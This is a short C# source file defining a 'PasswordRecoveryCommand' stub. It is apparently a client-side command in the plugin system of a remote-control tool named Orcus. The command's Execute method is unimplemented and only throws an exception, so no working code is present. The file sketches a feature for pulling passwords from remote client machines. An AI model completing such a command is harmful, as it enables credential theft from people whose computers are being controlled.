using System;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.Client
{
    public class PasswordRecoveryCommand : StaticCommand
    {
        public override Guid CommandId { get; } = new Guid(0x395990a8, 0x6961, 0xa84a, 0xbc, 0x40, 0xc1, 0x1d, 0x88,
            0x65, 0x34, 0x0b);

        public override string Name { get; } = Resources.StaticCommands.Client_PasswordRecoveryCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Client_PasswordRecoveryCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.Client;

        public override InputValidationResult ValidateInput()
        {
            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            throw new NotImplementedException();
        }
    }
}